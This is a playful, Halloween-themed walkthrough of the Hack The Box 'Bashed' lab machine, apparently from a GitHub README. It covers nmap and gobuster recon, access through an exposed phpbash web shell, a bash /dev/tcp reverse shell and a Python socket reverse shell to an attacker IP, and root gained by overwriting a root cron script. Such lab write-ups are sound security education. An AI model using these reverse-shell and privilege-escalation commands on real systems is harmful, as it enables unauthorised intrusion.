# HTB_Bashed
My writeup of the HTB Bashed machine.


🎃 Bashed - Hack The Box Walkthrough (Spooky Edition!) 🎃
Hack The Box Logo with Jack-O'-Lanterns

Machine Name: Bashed 🕷️
Difficulty: Easy (But Beware of Ghosts in the Shell! 👻💻)
Author: Lantern
Date Pwned: April 2025

🌑 Description: A Haunting in the Server
Bashed is an easy-rated but spooky machine on Hack The Box, lurking in the shadows with:

A cursed /dev directory (home to a possessed phpbash.php web shell)

A ghostly cron job running as root every full minute (👀)

Sudo permissions that scream "BOO!" (Allowing www-data to become scriptmanager with no password!)

Will you escape with the flags, or will the server's spirits trap you forever?

🕵️ Steps to Root (If You Dare...)
1. The Haunted Reconnaissance 🔍
Port Scanning with Nmap (By Candlelight 🕯️)
bash
nmap -sV -sC 10.10.10.68
Findings:

![1 nmap](https://github.com/user-attachments/assets/119d0d04-9b3a-4b2c-8252-725d96554d39)


Only port 80 (HTTP) is open—like a single flickering light in a haunted house.

Running Apache 2.4.18 (an ancient version, whispering vulnerabilities in the wind).

Web Enumeration (Tiptoeing Through the Directories)
Manual Browsing:

A blog post cryptically mentions "phpbash"—could it be the ghost in the machine?

Directory Fuzzing (Gobuster, the Digital Lantern 🔦):

```bash
gobuster dir -u http://10.10.10.68 -w /usr/share/wordlists/dirbuster/directory-list-2.3-medium.txt
```

Key Findings:

/dev → Contains phpbash.php (a cursed web shell).

![2 php](https://github.com/user-attachments/assets/32cdd10f-2fd1-4852-b0b7-1cfe8e32defc)


/uploads → Echoes of forgotten files...

2. Summoning the Shell (Initial Access) 🧙‍♂️
Exploiting phpbash.php (The Possessed Script)
Navigate to the haunted /dev directory:

http://10.10.10.68/dev/phpbash.php
A ghostly terminal appears! (You now have www-data access.)

![3 uploads](https://github.com/user-attachments/assets/aa5be0d1-9a52-469d-8286-b75bc9eda30c)


Conjure a reverse shell (Beware of spirits interfering!):

On attacker machine (by the firelight 🔥):

```bash
nc -nvlp 1234
```

![4 shell](https://github.com/user-attachments/assets/a05448f2-3857-4405-b329-4de8740d578a)


In phpbash (chanting the incantation):

```bash
bash -c 'bash -i >& /dev/tcp/YOUR_IP/1234 0>&1'
```

Stabilize the connection (before the ghosts disconnect you!):

```bash
python -c 'import pty; pty.spawn("/bin/bash")'
```

3. The Cursed Privilege Escalation ⚡
Checking sudo Permissions (The Witch’s Spellbook 📜)

```bash
sudo -l
```

Output (A Frightening Discovery!):

User www-data may run the following commands on bashed:  
    (scriptmanager : scriptmanager) NOPASSWD: ALL
"ALL" commands as scriptmanager?! This is black magic!

Becoming scriptmanager (The Transformation Ritual 🐍)\

```bash
sudo -u scriptmanager bash -i
```

![5 reverse shell](https://github.com/user-attachments/assets/6911748d-b817-40c5-865d-692fb2baef44)


You have assumed the identity of scriptmanager!

The Haunted /scripts Directory
A ghostly test.py script runs every minute as root!

test.txt is overwritten—proof of the undead cron job!

Exploiting the Cron Job (The Final Curse!)
Replace test.py with a reverse shell (Written in blood-red Python 🩸):

```python
import socket,subprocess,os
s=socket.socket(socket.AF_INET,socket.SOCK_STREAM)
s.connect(("YOUR_IP",1111))
os.dup2(s.fileno(),0)
os.dup2(s.fileno(),1)
os.dup2(s.fileno(),2)
p=subprocess.call(["/bin/sh","-i"])
```

Set up a listener (The summoning circle 🔮):

```bash
nc -nvlp 1111
```

![6 root shell](https://github.com/user-attachments/assets/8075dbea-ab32-47be-8e99-c143d6a2cc52)


Wait... (The clock strikes midnight... ⏳)

ROOT SHELL OBTAINED! (The spirits bow before you! 👑)

🏴‍☠️ The Treasure (Flags)
User Flag (Hidden in the scriptmanager’s coffin 💀):

```bash
cat /home/*******/user.txt
```

Root Flag (The Phantom’s Final Secret 🗝️):

```bash
cat /****/root.txt
```

💀 Key Takeaways (Lessons from the Crypt)
✅ Always check /dev—it might contain a possessed shell!
✅ sudo -l reveals terrifying permissions (like ALL commands as another user!)
✅ Cron jobs are often run by root ghosts—check /etc/crontab!

